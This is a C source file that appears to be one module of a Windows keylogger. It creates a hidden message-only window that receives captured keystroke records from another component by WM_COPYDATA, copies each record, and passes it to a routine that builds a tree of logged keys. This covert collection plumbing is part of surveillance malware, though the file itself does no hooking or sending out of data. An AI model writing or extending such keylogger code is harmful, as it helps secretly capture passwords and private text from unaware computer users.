//** Running in the CreateHiddenWindow Thread.
//** Hidden Window is created just to receive msgs.
//** Needed to capture WM_COPYDATA msg.

#include "..\..\..\Include\Keylog.h"

extern	BOOL		fWindowCreated;
PCOPYDATASTRUCT		pMyCDS;
HWND				hWnd;

DWORD WINAPI CreateHiddenWindow(HINSTANCE hInstance) {
    fWindowCreated = TRUE;

    HINSTANCE hDllInstance = (HINSTANCE)hInstance;

    MSG Msg;
    WNDCLASSEX wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hDllInstance;
    wcex.hbrBackground = NULL;
    wcex.lpszMenuName = NULL;
    wcex.hIcon = NULL;
    wcex.hCursor = NULL;
    wcex.lpszClassName = KLIF_WND_CLASS_NAME;
    wcex.hIconSm = NULL;

    if (!RegisterClassEx(&wcex)) {
        MessageBox(NULL, TEXT("This program requires Windows NT"), TEXT("Error!"), MB_ICONERROR);
        return(FALSE);
    }

    hWnd = CreateWindowEx(
        0,
        KLIF_WND_CLASS_NAME, KLIF_WND_TITLE,
        WS_CHILD,
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        HWND_MESSAGE,
        NULL,
        hDllInstance,
        NULL
    );

    if (hWnd == NULL) {
        MessageBox(NULL, TEXT("Could not create window"), TEXT("Key Logger"), MB_ICONERROR);
        return(FALSE);
    }

    UpdateWindow(hWnd);

    while (GetMessage(&Msg, NULL, 0, 0)) {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    return TRUE;
}

LRESULT WINAPI WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE:
            return 0;

        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;

        case WM_COPYDATA:
        {
            pMyCDS = (PCOPYDATASTRUCT)lParam;

            switch (pMyCDS->dwData) {
                case KL_TEMP_LINKLIST_DATA:
                    CopyofWMCopyData(((KLTEMPDATA *)(pMyCDS->lpData)));
                    break;
            }
            return 0;
        }
    }

    return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

BOOL CopyofWMCopyData(KLTEMPDATA *pCopyData) {
    LPDWORD lpBuildTreeThreadID = NULL;
    KLTEMPDATA *pLocalCopy = NULL;

    pLocalCopy = (KLTEMPDATA *)malloc(sizeof(KLTEMPDATA));
    if (pLocalCopy == NULL)
        return FALSE;

    memcpy(pLocalCopy, pCopyData, sizeof(KLTEMPDATA));
    pLocalCopy->pNextLink = NULL;

    BuildKLTree(pLocalCopy);

    free(pLocalCopy);

    return TRUE;
}
